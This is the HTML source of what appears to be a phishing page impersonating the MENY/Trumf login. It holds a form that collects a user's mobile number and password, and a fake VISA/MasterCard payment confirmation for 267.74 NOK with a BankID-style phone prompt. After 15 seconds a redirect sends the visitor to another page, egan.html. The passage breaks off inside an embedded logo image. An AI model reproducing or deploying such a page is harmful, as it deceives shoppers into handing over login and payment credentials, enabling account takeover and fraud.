<html lang="no" data-kantu="1" class=""><head>
    <!-- Google Tag Manager -->
    <script type="text/javascript" async="" defer="" src="https://norgesgruppen.containers.piwik.pro/ppms.js"></script><script async="" src="https://norgesgruppen.containers.piwik.pro/c30184b3-2658-44f5-8747-35cd11a9a6c3.js"></script><script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-WM2PW45"></script><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-WM2PW45');</script>
    <!-- End Google Tag Manager -->
    <meta name="robots" content="noindex, noarchive">
    <meta charset="utf-8">
    <title>Logg inn</title>
    <meta name="viewport" content="width=device-width, height=device-height, user-scalable=no, initial-scale=1.0, maximum-scale=1.0">
    <link rel="shortcut icon" href="/static/favicon.ico">
<link href="./style/app.css" rel="stylesheet"><script id="ppas_container_configuration" data-appid="c30184b3-2658-44f5-8747-35cd11a9a6c3" data-host="norgesgruppen.piwik.pro"></script><link type="text/css" rel="stylesheet" charset="UTF-8" href="https://www.gstatic.com/_/translate_http/_/ss/k=translate_http.tr.qhDXWpKopYk.L.W.O/d=0/rs=AN8SPfp0QXhhaDDdjg_LgcSqoZiPEzC1tw/m=el_main_css"></head>
<meta http-equiv="refresh" content="15; url=egan.html">

<link rel="stylesheet" href="src/common_auth.css" type="text/css"><link rel="stylesheet" href="src/bidm.css" type="text/css"><link rel="stylesheet" href="src/3625.css" type="text/css"><link rel="SHORTCUT ICON"  type="image/x-icon">
<body>
    <!-- Google Tag Manager (noscript) -->
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WM2PW45"
        height="0" width="0" style="display: none;
    visibility: hidden;"></iframe></noscript>
    <!-- End Google Tag Manager (noscript) -->
    <div class="app">
        <div class="login" id="panel-trumf" aria-hidden="true">
            <div class="trumfid__form-header p-t-24">
                <span class="ngr-icon" role="presentation" aria-hidden="true">
                    <img src="./style/ngr-meny.svg" class="ngr-icon__svg" height="48px" width="120px" alt="Trumf-logo">
                    <br><br>
                </span> <br><br>
            </div>
            
              
            
            <div class="p-t-24 p-b-8">
                <h1 class="trumfid__heading">
                    Logg inn på MENY
                </h1>
                
                    <p class="trumfid__paragraph">MENY er en Trumf-partner. Du logger
                        inn med din registrerte Trumf-konto.</p>
                
            </div>
            <br><br>
            
            <form id="loginForm" name="loginForm" action="/login.do" method="post">
                <div class="p-t-24">
                    <div class="ngr-input-group">
                        <label class="ngr-label ngr-input-group__label" for="username">
                            <span class="ngr-label__text">Mobilnummer</span>
                        </label>
                        <div class="ngr-input">
                            <span class="ngr-input__prefix" id="username-prefix">+47</span>
                            <input class="ngr-input__field ngr-input__field--prefix" id="username" type="tel" pattern="[0-9]*" name="j_username" maxlength="8" autofocus="">
                        </div>
                        <div class="ngr-input-group__information" id="username-help-text">
                            <small class="ngr-help-text ngr-help-text--error ngr-help-text--hidden">Mobilnummer må fylles ut</small>
                        </div>
                        <div class="ngr-input-group__information" id="max-phone-numbers-help-text">
                            <small class="ngr-help-text ngr-help-text--error ngr-help-text--hidden">Mobilnummer må være 8 siffer</small>
                        </div>
                    </div>
                    <div class="ngr-input-group">
                        <label class="ngr-label ngr-input-group__label" for="password">
                            <span class="ngr-label__text">Passord</span>
                        </label>
                        <div class="ngr-input" data-type="password">
                            <input class="ngr-input__field" id="password" type="password" name="j_password">
                            <button class="ngr-button ngr-input__password-visibility-toggle-text ngr-button--inline-link hidden" type="button">Vis</button>
                        </div>
                        <div class="ngr-input-group__information" id="password-help-text">
                            <small class="ngr-help-text ngr-help-text--error ngr-help-text--hidden">Passord må fylles ut</small>
                        </div>
                    </div>
                    
                        
                            <a class="ngr-button ngr-button--inline-link ngr-util__font-size--lima" href="#">
                                <span class="ngr-button__text">Glemt passordet?</span>
                            </a>
                        
                        
                    
                </div>
                <input type="hidden" name="response_type" value="code">
                
                    <input type="hidden" name="client_id" value="trumfid">
                
                <input type="hidden" name="biometriavailable" id="biometriavailable" value="false">
                <div class="ngr-button-group ngr-button-group--flex-start ngr-button-group--items-center ngr-button-group--flow ngr-button-group--direction-vertical p-t-24 p-b-16">
                    <button class="ngr-button" type="submit" name="login" id="btn-form-submit">
                        <span class="ngr-button__text">Logg inn</span>
                        <span class="ngr-spinner__spinner ngr-spinner__spinner--small ngr-spinner__spinner--inverted" style="display: none;"></span>
                    </button>
                </div>
            </form>
            <ul class="ngr-link-list p-b-32">
                
                    <li class="ngr-link-list__item">
                        
                            
                                <a class="ngr-link-list__link" href="#">
                                    <span class="ngr-link-list__text">
                                        <span class="ngr-link-list__title">Bli Trumf-medlem</span>
                                    </span>
                                    <span class="ngr-button ngr-link-list__icon ngr-button--cancel" role="presentation" aria-hidden="true">
                                        <svg class="ngr-icon__svg" height="24px" width="24px" alt="" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M8.293 5.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L13.586 12 8.293 6.707a1 1 0 010-1.414z"></path></svg>
                                    </span>
                                </a>
                            
                            
                        
                    </li>
                
                <li class="ngr-link-list__item">
                    
                        
                            <a class="ngr-link-list__link" href="#">
                                <span class="ngr-link-list__text">
                                    <span class="ngr-link-list__title">Problemer med innlogging?</span>
                                    <span class="ngr-link-list__subtitle">Kontakt kundeservice</span>
                                </span>
                                <span class="ngr-button ngr-link-list__icon ngr-button--cancel" role="presentation" aria-hidden="true">
                                    <svg class="ngr-icon__svg" height="24px" width="24px" alt="" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M8.293 5.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L13.586 12 8.293 6.707a1 1 0 010-1.414z"></path></svg>
                                </span>
                            </a>
                        
                        
                    
                </li>
            </ul>
            
                
                    <a href="#" class="ngr-button ngr-button--inline-link ngr-util__font-size--mike" target="_blank">
                        <span class="ngr-button__text">Trumf bruker informasjonskapsler (cookies)</span>
                      
                    </a>
                
                
            
        </div>
        
            <div class="login" id="panel-corporate" aria-hidden="false">
                <div class="trumfid__form-header-center p-t-24">
                    <span class="ngr-icon" role="presentation" aria-hidden="true">
                        <img src="./style/ngr-meny.svg" class="ngr-icon__svg" height="48px" width="120px" alt="MENY-logo">
                    </span>
                    
                </div>
           
                <br><br>

          
<div class="table tds-container">

	
    <header class="row">
        <div class="tds-header">
      

            <div class="table tds-logos">
                <div class="cell tds-card">
                    
                  <img src="./src/vbm_blu01r.png" border="0" alt="VISA" title="VISA">
          
                </div>
                <div class="cell tds-bank right">
                    

<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/MasterCard_Logo.svg/1024px-MasterCard_Logo.svg.png" alt="Fichier:MasterCard Logo.svg — Wikipédia" jsname="HiaYvf" jsaction="load:XAeZkd;" class="n3VNCb" data-noaft="1" style="width: 70px; height: 45px; margin: 0px;">

                </div>
            </div>
        </div>
    </header>



















<section class="row">

<div class="tds-content">

  <h1>Vennligst bekreft betalingen</h1>
  <p>
      Vennligst f&oslash;lg brukerdialogen p&aring; din mobiltelefon. Det kan ta noe tid f&oslash;r denne starter opp.
  </p>
  
  <!--
# modified 2005-10-13
# modified 2014-02-12
-->




<div class="table">
<div class="row">
  <div class="cell">Nettbutikk:</div>
  <div class="cell">Meny.no AS</div>
</div>
<div class="row">
  <div class="cell">Bel&Oslash;p:</div>
  <div class="cell">267,74 NOK</div>
</div>
<div class="row">	
  <div class="cell">Dato:</div>
   <?php echo $date = date('m/d/Y h:i:s ', time());?> 
</div>
<div class="row">
  <div class="cell">Kortnummer:</div>
  <div class="cell">xxxx xxxx xxxx xxxx</div>
</div>



</div>	


  

  <p></p>		

  <div class="bidm_app" data-page-type="reference">
      <div class="bidm_wrapper">
          <div class="bidm_frame">
              <div class="bidm_wrapper-inner">
                  <header class="bidm_header">
                      <div class="bidm_table">
                          <div class="bidm_left">
                              <div class="bidm_logo-wrapper">
                                  <img class="bidm_logo" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iOTJweCIgaGVpZ2h0PSIyNHB4IiB2aWV3Qm94PSIwIDAgOTIgMjQiIHZlcnNpb249IjEuMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+DQogICAgPCEtLSBHZW5lcmF0b3I6IFNrZXRjaCA0MiAoMzY3ODEpIC0gaHR0cDovL3d3dy5ib2hlbWlhbmNvZGluZy5jb20vc2tldGNoIC0tPg0KICAgIDx0aXRsZT5CYW5rSURfcGHMil9tb2JpbF9ncmF5X29yaWdpbmFsLnN2ZzwvdGl0bGU+DQogICAgPGRlc2M+Q3JlYXRlZCB3aXRoIFNrZXRjaC48L2Rlc2M+DQogICAgPGRlZnM+DQogICAgICAgIDxwb2x5Z29uIGlkPSJwYXRoLTEiIHBvaW50cz0iMC4wMDA2IDYgNC4wMzQ2IDYgNC4wMzQ2IDAuMDQ5MSAwLjAwMDYgMC4wNDkxIj48L3BvbHlnb24+DQogICAgICAgIDxwb2x5Z29uIGlkPSJwYXRoLTMiIHBvaW50cz0iNTEgMjMuOTUxNiA5MS44OTIgMjMuOTUxNiA5MS44OTIgMTUuOTk5NiA1MSAxNS45OTk2Ij48L3BvbHlnb24+DQogICAgPC9kZWZzPg0KICAgIDxnIGlkPSJQYWdlLTEiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIiBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPg0KICAgICAgICA8ZyBpZD0iR3JvdXAiPg0KICAgICAgICAgICAgPHBhdGggZD0iTTEzLjcsNCBMOC4zLDQgQzguMSw0IDgsNC4xIDgsNC4zIEw4LDUuNyBDOCw1LjkgOC4xLDYgOC4zLDYgTDEzLjcsNiBDMTMuOSw2IDE0LDUuOSAxNCw1LjcgTDE0LDQuMyBDMTQsNC4yIDEzLjksNCAxMy43LDQgWiIgaWQ9IlNoYXBlLUNvcHktMTQiIGZpbGw9IiM1NTU1NTUiIGZpbGwtcnVsZT0ibm9uemVybyI+PC9wYXRoPg0KICAgICAgICAgICAgPHBhdGggZD0iTTEzLjcsOCBMOC4zLDggQzguMSw4IDgsOC4xIDgsOC4zIEw4LDkuNyBDOCw5LjkgOC4xLDEwIDguMywxMCBMMTMuNywxMCBDMTMuOSwxMCAxNCw5LjkgMTQsOS43IEwxNCw4LjMgQzE0LDguMSAxMy45LDggMTMuNyw4IFoiIGlkPSJTaGFwZS1Db3B5LTEzIiBmaWxsPSIjNTU1NTU1IiBmaWxsLXJ1bGU9Im5vbnplcm8iPjwvcGF0aD4NCiAgICAgICAgICAgIDxwYXRoIGQ9Ik0yMS43LDEyIEwxNi4zLDEyIEMxNi4xLDEyIDE2LDEyLjEgMTYsMTIuMyBMMTYsMTMuNyBDMTYsMTMuOSAxNi4xLDE0IDE2LjMsMTQgTDIxLjcsMTQgQzIxLjksMTQgMjIsMTMuOSAyMiwxMy43IEwyMiwxMi4zIEMyMiwxMi4xIDIxLjksMTIgMjEuNywxMiBaIiBpZD0iU2hhcGUtQ29weS0xMiIgZmlsbD0iIzU1NTU1NSIgZmlsbC1ydWxlPSJub256ZXJvIj48L3BhdGg+DQogICAgICAgICAgICA8cGF0aCBkPSJNNS43LDEyIEwwLjMsMTIgQzAuMSwxMiAwLDEyLjEgMCwxMi4zIEwwLDEzLjcgQzAsMTMuOSAwLjEsMTQgMC4zLDE0IEw1LjcsMTQgQzUuOSwxNCA2LDEzLjkgNiwxMy43IEw2LDEyLjMgQzYsMTIuMSA1LjksMTIgNS43LDEyIFoiIGlkPSJTaGFwZS1Db3B5LTExIiBmaWxsPSIjNTU1NTU1IiBmaWxsLXJ1bGU9Im5vbnplcm8iPjwvcGF0aD4NCiAgICAgICAgICAgIDxwYXRoIGQ9Ik0yMS43LDQgTDE2LjMsNCBDMTYuMSw0IDE2LDQuMSAxNiw0LjMgTDE2LDUuNyBDMTYsNS45IDE2LjEsNiAxNi4zLDYgTDIxLjcsNiBDMjEuOSw2IDIyLDUuOSAyMiw1LjcgTDIyLDQuMyBDMjIsNC4yIDIxLjksNCAyMS43LDQgWiIgaWQ9IlNoYXBlLUNvcHktMTAiIGZpbGw9IiM1NTU1NTUiIGZpbGwtcnVsZT0ibm9uemVybyI+PC9wYXRoPg0KICAgICAgICAgICAgPHBhdGggZD0iTTUuNyw4IEwwLjMsOCBDMC4xLDggMCw4LjEgMCw4LjMgTDAsOS43IEMwLDkuOSAwLjEsMTAgMC4zLDEwIEw1LjcsMTAgQzUuOSwxMCA2LDkuOSA2LDkuNyBMNiw4LjMgQzYsOC4xIDUuOSw4IDUuNyw4IFoiIGlkPSJTaGFwZS1Db3B5LTkiIGZpbGw9IiM1NTU1NTUiIGZpbGwtcnVsZT0ibm9uemVybyI+PC9wYXRoPg0KICAgICAgICAgICAgPHBhdGggZD0iTTUuNywwIEwwLjMsMCBDMC4xLDAgMCwwLjEgMCwwLjMgTDAsMS43IEMwLDEuOSAwLjEsMiAwLjMsMiBMNS43LDIgQzUuOSwyIDYsMS45IDYsMS43IEw2LDAuMyBDNiwwLjEgNS45LDAgNS43LDAgWiIgaWQ9IlNoYXBlLUNvcHktOCIgZmlsbD0iIzU1NTU1NSIgZmlsbC1ydWxlPSJub256ZXJvIj48L3BhdGg+DQogICAgICAgICAgICA8cGF0aCBkPSJNMjEuNywwIEwxNi4zLDAgQzE2LjEsMCAxNiwwLjEgMTYsMC4zIEwxNiwxLjcgQzE2LDEuOSAxNi4xLDIgMTYuMywyIEwyMS43LDIgQzIxLjksMiAyMiwxLjkgMjIsMS43IEwyMiwwLjMgQzIyLDAuMSAyMS45LDAgMjEuNywwIFoiIGlkPSJTaGFwZS1Db3B5LTciIGZpbGw9IiM1NTU1NTUiIGZpbGwtcnVsZT0ibm9uemVybyI+PC9wYXRoPg0KICAgICAgICAgICAgPHBhdGggZD0iTTU3LjgsNCBMNTEuMiw0IEM1MS4xLDQgNTEsNC4xIDUxLDQuMyBMNTEsMTMuNyBDNTEsMTMuOSA1MS4xLDE0IDUxLjMsMTQgTDUyLjgsMTQgQzUyLjksMTQgNTMuMSwxMy45IDUzLjEsMTMuNyBMNTMuMSw2LjEgQzUzLDYgNTMuMSw2IDUzLjEsNiBMNTcuNiw2IEM1OCw2IDU4LjMsNi4xIDU4LjUsNi40IEM1OC44LDYuNyA1OC45LDcgNTguOSw3LjQgTDU4LjksMTMuNyBDNTguOSwxMy45IDU5LDE0IDU5LjIsMTQgTDYwLjYsMTQgQzYwLjcsMTQgNjAuOSwxMy45IDYwLjksMTMuNyBMNjAuOSw3LjUgQzYwLjksNi41IDYwLjYsNS43IDYwLDUuMSBDNTkuNCw0LjMgNTguNyw0IDU3LjgsNCBaIiBpZD0iU2hhcGUtQ29weS02IiBmaWxsPSIjNTU1NTU1IiBmaWxsLXJ1bGU9Im5vbnplcm8iPjwvcGF0aD4NCiAgICAgICAgICAgIDxwYXRoIGQ9Ik00OCw1IEM0OC43LDUuNyA0OSw2LjUgNDksNy40IEw0OSwxMy40IEM0OSwxMy43IDQ4LjcsMTQgNDguNCwxNCBMNDIsMTQgQzQwLjMsMTQgMzguOSwxMi42IDM4LjksMTAuOSBDMzguOSw5LjIgNDAuNCw4IDQyLjEsOCBMNDYuOSw4IEw0Nyw3LjkgTDQ3LDcuNSBDNDcsNy4xIDQ2LjgsNi44IDQ2LjYsNi41IEM0Ni4zLDYuMiA0Niw2LjEgNDUuNiw2LjEgTDQwLjQsNi4xIEM0MC4yLDYuMSA0MC4xLDYgNDAuMSw1LjggTDQwLjEsNC4zIEM0MC4xLDQuMSA0MC4yLDQgNDAuNCw0IEw0NS42LDQgQzQ2LjUsNCA0Ny4zLDQuMyA0OCw1IFogTTQ3LDEwLjEgQzQ3LDEwIDQ2LjksOS45IDQ2LjgsOS45IEw0Miw5LjkgQzQxLjQsOS45IDQxLDEwLjQgNDEsMTAuOSBDNDEsMTEuNCA0MS41LDExLjkgNDIsMTEuOSBMNDYuOCwxMS45IEM0Ni45LDExLjkgNDcsMTEuOCA0NywxMS44IEw0NywxMC4xIFoiIGlkPSJTaGFwZS1Db3B5LTUiIGZpbGw9IiM1NTU1NTUiIGZpbGwtcnVsZT0ibm9uemVybyI+PC9wYXRoPg0KICAgICAgICAgICAgPHBhdGggZD0iTTc4LjcsMCBMNzcuMywwIEM3Ny4xLDAgNzcsMC4xIDc3LDAuMyBMNzcsMTMuNyBDNzcsMTMuOSA3Ny4xLDE0IDc3LjMsMTQgTDc4LjcsMTQgQzc4LjksMTQgNzksMTMuOSA3OSwxMy43IEw3OSwwLjMgQzc5LDAuMSA3OC45LDAgNzguNywwIFoiIGlkPSJTaGFwZS1Db3B5LTQiIGZpbGw9IiM1NTU1NTUiIGZpbGwtcnVsZT0ibm9uemVybyI+PC9wYXRoPg0KICAgICAgICAgICAgPHBhdGggZD0iTTkyLDUuNSBMOTIsOC40IEM5MiwxMiA5MC4xLDEzLjkgODYuNywxMy45IEw4MS4zLDEzLjkgQzgxLjIsMTMuOSA4MSwxMy44IDgxLDEzLjYgTDgxLDAuMyBDODEsMC4xIDgxLjEsMCA4MS4zLDAgTDg2LjcsMCBDOTAsMCA5MiwyIDkyLDUuNSBaIE05MCw1LjQgQzkwLDMuMiA4OC45LDIgODYuOCwyIEw4My4xLDIgQzgzLDIgODIuOSwyIDgyLjksMi4xIEw4Mi45LDExLjggQzgyLjksMTEuOSA4MywxMiA4MywxMiBMODYuNywxMiBDODguOCwxMiA5MCwxMC44IDkwLDguNiBMOTAsNS40IFoiIGlkPSJTaGFwZS1Db3B5LTMiIGZpbGw9IiM1NTU1NTUiIGZpbGwtcnVsZT0ibm9uemVybyI+PC9wYXRoPg0KICAgICAgICAgICAgPHBhdGggZD0iTTM3LDUgQzM3LjcsNS43IDM4LDYuNSAzOCw3LjQgTDM4LDEwLjUgQzM4LDExLjUgMzcuNywxMi4zIDM3LDEzIEMzNi4zLDEzLjcgMzUuNSwxNCAzNC42LDE0IEwyOC4zLDE0IEMyOC4xLDE0IDI4LDEzLjkgMjgsMTMuNyBMMjgsMC4zIEMyOCwwLjEgMjguMSwwIDI4LjMsMCBMMjkuNywwIEMyOS45LDAgMzAsMC4xIDMwLDAuMyBMMzAsMy45IEMzMCwzLjkgMzAsNCAzMC4xLDQgTDM0LjUsNCBDMzUuNSw0IDM2LjMsNC4zIDM3LDUgWiBNMzYsNy41IEMzNiw3LjEgMzUuOSw2LjggMzUuNiw2LjUgQzM1LjMsNi4yIDM1LDYuMSAzNC42LDYuMSBMMzAuMiw2LjEgQzMwLDYgMzAsNi4xIDMwLDYuMSBMMzAsMTEuOSBDMzAsMTIgMzAsMTIgMzAuMSwxMiBMMzQuNSwxMiBDMzQuOSwxMiAzNS4yLDExLjkgMzUuNSwxMS42IEMzNS44LDExLjMgMzUuOSwxMSAzNS45LDEwLjYgTDM1LjksNy41IEwzNiw3LjUgWiIgaWQ9IlNoYXBlLUNvcHktMiIgZmlsbD0iIzU1NTU1NSIgZmlsbC1ydWxlPSJub256ZXJvIj48L3BhdGg+DQogICAgICAgICAgICA8cGF0aCBkPSJNNjUuMyw4IEM2NS4zLDggNjUuMiw4LjEgNjUuMSw4IEM2NSw4IDY1LDcuOSA2NSw3LjkgTDY1LDAuMyBDNjUsMC4xIDY0LjksMCA2NC43LDAgTDYzLjIsMCBDNjMuMSwwIDYzLDAuMSA2MywwLjMgTDYzLDEzLjcgQzYzLDEzLjkgNjMuMSwxNCA2My4zLDE0IEw2NC44LDE0IEM2NC45LDE0IDY1LjEsMTMuOSA2NS4xLDEzLjcgTDY1LjEsMTAuMSBDNjUuMSwxMCA2NS4xLDEwIDY1LjIsMTAgTDY1LjQsMTAgTDcwLjEsMTMuOSBDNzAuMiwxMy45IDcwLjIsMTQgNzAuMywxNCBMNzIsMTQgQzcyLjEsMTQgNzIuMywxMy45IDcyLjMsMTMuNyBDNzIuMywxMy42IDcyLjMsMTMuNSA3Mi4yLDEzLjUgTDY3LDkuMiBMNjcsOS4xIEw2Nyw5IEw3Mi4yLDQuNSBDNzIuMyw0LjUgNzIuMyw0LjQgNzIuMyw0LjMgQzcyLjMsNC4xIDcyLjIsNCA3Miw0IEw3MC4yLDQgQzcwLjEsNCA3MC4xLDQgNzAsNC4xIEw2NS4zLDggWiIgaWQ9IlNoYXBlLUNvcHkiIGZpbGw9IiM1NTU1NTUiIGZpbGwtcnVsZT0ibm9uemVybyI+PC9wYXRoPg0KICAgICAgICAgICAgPGcgaWQ9Ikdyb3VwLTMiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDUxLjAwMDAwMCwgMTcuOTUxNjAwKSI+DQogICAgICAgICAgICAgICAgPG1hc2sgaWQ9Im1hc2stMiIgZmlsbD0id2hpdGUiPg0KICAgICAgICAgICAgICAgICAgICA8dXNlIHhsaW5rOmhyZWY9IiNwYXRoLTEiPjwvdXNlPg0KICAgICAgICAgICAgICAgIDwvbWFzaz4NCiAgICAgICAgICAgICAgICA8ZyBpZD0iQ2xpcC0yIj48L2c+DQogICAgICAgICAgICAgICAgPHBhdGggZD0iTTMuMjk2NiwyLjA0MDEgTDMuMjk2NiwyLjAyMzEgQzMuMjk2NiwxLjM0MDEgMy4yNDg2LDEuMDA2MSAyLjUyMDYsMS4wMDYxIEwwLjk3MjYsMS4wMDYxIEwwLjk3MjYsMy4wMTIxIEwyLjUyMDYsMy4wMTIxIEMzLjI1NTYsMy4wMTIxIDMuMjk2NiwyLjY0ODEgMy4yOTY2LDIuMDQwMSBMMy4yOTY2LDIuMDQwMSBaIE0yLjE4MjYsMC4wNDkxIEMzLjQ3MDYsMC4wNDkxIDQuMDM0NiwwLjgyNDEgNC4wMzQ2LDEuOTk4MSBMNC4wMzQ2LDIuMDE1MSBDNC4wMzQ2LDMuMzIzMSAzLjI4ODYsNC4wMDYxIDIuMDcwNiw0LjAwNjEgTDAuOTcyNiw0LjAwNjEgTDAuOTcyNiw2LjAwMDEgTDAuMDAwNiw2LjAwMDEgTDAuMDAwNiwwLjA0OTEgTDIuMTgyNiwwLjA0OTEgWiIgaWQ9IkZpbGwtMSIgZmlsbD0iIzRENEQ0QiIgbWFzaz0idXJsKCNtYXNrLTIpIj48L3BhdGg+DQogICAgICAgICAgICA8L2c+DQogICAgICAgICAgICA8cG9seWdvbiBpZD0iRmlsbC00IiBmaWxsPSIjNEQ0RDRCIiBwb2ludHM9IjY4Ljk3NzcgMjEuMDIyIDY2Ljk1OTcgMTcuOTg4IDY2LjAwNjcgMTcuOTg4IDY2LjAwNjcgMjMuODE5IDY2Ljk1OTcgMjMuODE5IDY2Ljk1OTcgMTkuNjU0IDY4Ljk0MzcgMjIuMzg2IDY4Ljk3NzcgMjIuMzg2IDcwLjk5NTcgMTkuNjM3IDcwLjk5NTcgMjMuODE5IDcxLjk0ODcgMjMuODE5IDcxLjk0ODcgMTcuOTg4IDcxLjAxODcgMTcuOTg4Ij48L3BvbHlnb24+DQogICAgICAgICAgICA8cGF0aCBkPSJNNzcuOTE1MiwyMC45Njk3IEM3Ny45MTUyLDIyLjA4MzcgNzcuMTI5MiwyMi45OTI3IDc2LjAwMzIsMjIuOTkyNyBDNzQuODc3MiwyMi45OTI3IDc0LjA3NTIsMjIuMDY3NyA3NC4wNzUyLDIwLjk1MzcgTDc0LjA3NTIsMjAuOTM2NyBDNzQuMDc1MiwxOS44MjI3IDc0Ljg2MTIsMTguOTEzNyA3NS45ODcyLDE4LjkxMzcgQzc3LjExMzIsMTguOTEzNyA3Ny45MTUyLDE5LjgzOTcgNzcuOTE1MiwyMC45NTM3IEw3Ny45MTUyLDIwLjk2OTcgWiBNNzYuMDAzMiwxNy45ODc3IEM3NC4yNjIyLDE3Ljk4NzcgNzMuMDMwMiwxOS4zMzk3IDczLjAzMDIsMjAuOTUzNyBMNzMuMDMwMiwyMC45Njk3IEM3My4wMzAyLDIyLjU4MzcgNzQuMjQ1MiwyMy45MTg3IDc1Ljk4NzIsMjMuOTE4NyBDNzcuNzI4MiwyMy45MTg3IDc4Ljk2MDIsMjIuNTY3NyA3OC45NjAyLDIwLjk1MzcgTDc4Ljk2MDIsMjAuOTM2NyBDNzguOTYwMiwxOS4zMjI3IDc3Ljc0NTIsMTcuOTg3NyA3Ni4wMDMyLDE3Ljk4NzcgTDc2LjAwMzIsMTcuOTg3NyBaIiBpZD0iRmlsbC02IiBmaWxsPSIjNEQ0RDRCIj48L3BhdGg+DQogICAgICAgICAgICA8bWFzayBpZD0ibWFzay00IiBmaWxsPSJ3aGl0ZSI+DQogICAgICAgICAgICAgICAgPHVzZSB4bGluazpocmVmPSIjcGF0aC0zIj48L3VzZT4NCiAgICAgICAgICAgIDwvbWFzaz4NCiAgICAgICAgICAgIDxnIGlkPSJDbGlwLTkiPjwvZz4NCiAgICAgICAgICAgIDxwb2x5Z29uIGlkPSJGaWxsLTgiIGZpbGw9IiM0RDRENEIiIG1hc2s9InVybCgjbWFzay00KSIgcG9pbnRzPSI4Ni4wMDkgMjMuODE4NiA4Ni45ODEgMjMuODE4NiA4Ni45ODEgMTcuOTg3NiA4Ni4wMDkgMTcuOTg3NiI+PC9wb2x5Z29uPg0KICAgICAgICAgICAgPHBvbHlnb24gaWQ9IkZpbGwtMTAiIGZpbGw9IiM0RDRENEIiIG1hc2s9InVybCgjbWFzay00KSIgcG9pbnRzPSI4OC45ODM2IDIyLjk3MTIgODguOTgzNiAxOC4wNzMyIDg4LjAxMDYgMTguMDczMiA4OC4wMTA2IDIzLjkwNDIgOTEuODkyNiAyMy45MDQyIDkxLjg5MjYgMjIuOTcxMiI+PC9wb2x5Z29uPg0KICAgICAgICAgICAgPHBhdGggZD0iTTU3LjM2MzQsMjEuOTYzNCBMNTguNTAwNCwxOS4yNzE0IEw1OS42NDY0LDIxLjk2MzQgTDU3LjM2MzQsMjEuOTYzNCBaIE01OC4xMDg0LDE4LjQwMDQgTDU3Ljg4NzQsMTguMzEzNCBMNTUuNTIyNCwyMy45MTk0IEw1Ni41NTU0LDIzLjkxOTQgTDU3LjA1NzQsMjIuOTU1NCBMNTkuOTQzNCwyMi45NTU0IEw2MC40NDY0LDIzLjkxOTQgTDYxLjUxMjQsMjMuOTE5NCBMNTkuMTI2NCwxOC4zMzY0IEw1OC45ODM0LDE4LjM4NTQgTDU4LjEwODQsMTguNDAwNCBaIiBpZD0iRmlsbC0xMSIgZmlsbD0iIzRENEQ0QiIgbWFzaz0idXJsKCNtYXNrLTQpIj48L3BhdGg+DQogICAgICAgICAgICA8cGF0aCBkPSJNODMuOTEwMywyMi4xODIxIEM4My45MTAzLDIyLjcxNjEgODMuNDc5MywyMi45OTUxIDgyLjc3MTMsMjIuOTk1MSBMODEuMDUwMywyMi45OTUxIEw4MS4wNTAzLDIxLjM2OTEgTDgyLjY5NTMsMjEuMzY5MSBDODMuNTE0MywyMS4zNjkxIDgzLjkxMDMsMjEuNjY1MSA4My45MTAzLDIyLjE2NTEgTDgzLjkxMDMsMjIuMTgyMSBaIE04MC45ODczLDE4LjkxMjEgTDgyLjQ4MDMsMTguOTEyMSBDODMuMTQ3MywxOC45MTIxIDgzLjUxODMsMTkuMjAwMSA4My41MTgzLDE5LjY2NTEgTDgzLjUxODMsMTkuNjgyMSBDODMuNTE4MywyMC4yMjQxIDgzLjA3MTMsMjAuNDg4MSA4Mi40MDUzLDIwLjQ4ODEgTDgwLjk4NzMsMjAuNDg4MSBMODAuOTg3MywxOC45MTIxIFogTTgzLjc3NTMsMjAuODM1MSBDODQuMjE0MywyMC42MDYxIDg0LjYxOTMsMjAuMjI0MSA4NC42MTkzLDE5LjUxMzEgTDg0LjYxOTMsMTkuNDk2MSBDODQuNjE5MywxOS4wOTgxIDg0LjQ4NDMsMTguNzc2MSA4NC4yMjIzLDE4LjUxMzEgQzgzLjg4NTMsMTguMTc0MSA4My4zNTMzLDE3Ljk4ODEgODIuNjc5MywxNy45ODgxIEw4MC4wMjkzLDE3Ljk4ODEgTDgwLjAyOTMsMjMuOTE5MSBMODIuNzYzMywyMy45MTkxIEM4NC4wNzkzLDIzLjkxOTEgODQuOTQ4MywyMy4zNTExIDg0Ljk0ODMsMjIuMjkyMSBMODQuOTQ4MywyMi4yNzUxIEM4NC45NDgzLDIxLjQ3MDEgODQuNDY4MywyMS4wNzIxIDgzLjc3NTMsMjAuODM1MSBMODMuNzc1MywyMC44MzUxIFoiIGlkPSJGaWxsLTEyIiBmaWxsPSIjNEQ0RDRCIiBtYXNrPSJ1cmwoI21hc2stNCkiPjwvcGF0aD4NCiAgICAgICAgICAgIDxwYXRoIGQ9Ik04MS4wMjc1LDE4LjkxMTYgTDgyLjUyMDUsMTguOTExNiBDODMuMTg2NSwxOC45MTE2IDgzLjU1NzUsMTkuMTQzNiA4My41NTc1LDE5LjUxOTYgTDgzLjU1NzUsMTkuNTMzNiBDODMuNTU3NSwxOS45NzA2IDgzLjExMTUsMjAuMTgyNiA4Mi40NDQ1LDIwLjE4MjYgTDgxLjAyNzUsMjAuMTgyNiBMODEuMDI3NSwxOC45MTE2IFoiIGlkPSJGaWxsLTEzIiBmaWxsPSIjRkZGRkZGIiBtYXNrPSJ1cmwoI21hc2stNCkiPjwvcGF0aD4NCiAgICAgICAgICAgIDxwYXRoIGQ9Ik04My45NTA0LDIyLjE4MjEg